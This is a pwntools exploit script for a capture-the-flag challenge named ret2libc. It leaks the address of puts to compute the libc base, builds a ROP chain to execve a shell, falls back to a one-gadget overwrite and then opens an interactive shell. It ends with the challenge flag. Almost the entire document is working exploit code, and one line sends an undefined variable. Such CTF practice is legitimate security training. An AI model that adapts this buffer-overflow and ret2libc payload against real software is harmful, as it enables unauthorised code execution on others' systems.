from pwn import *
context.log_level = 'DEBUG'
#r=remote('isc.taiwan-te.ch',10006)
r=process('./ret2libc')
e=ELF('./ret2libc')
#raw_input()

puts_ofset=0x809c0#readelf find addr in libc
r.recvuntil(':')

r.sendline(puts)
r.recvuntil('\n')
s=r.recvuntil('\n')

real=int(s.split(':')[1])



base=real-puts_ofset


sh=0x1b3e9a#find useful strings in libc


pop_rdi = 0x2155#use ROPgadget find in libc
pop_rsi = 0x23e6a
pop_rdx = 0x1b96
pop_rax = 0x439c8
syscall = 0xd2975

p = 'a' * 0x38
p += p64(base + pop_rdi)
p += p64(base + sh)
p += p64(base + pop_rsi) #pop put next thing in stack
p += p64(0)
p += p64(base + pop_rdx)
p += p64(0)
p += p64(base + pop_rax)
p += p64(0x3b)
p += p64(base + syscall)

p='a'*0x38+p64(base+0x4f322)

r.recvuntil(': ')
r.sendline(p)




r.interactive()
#FLAG{118c_15_7h3_8357_g4dg37}

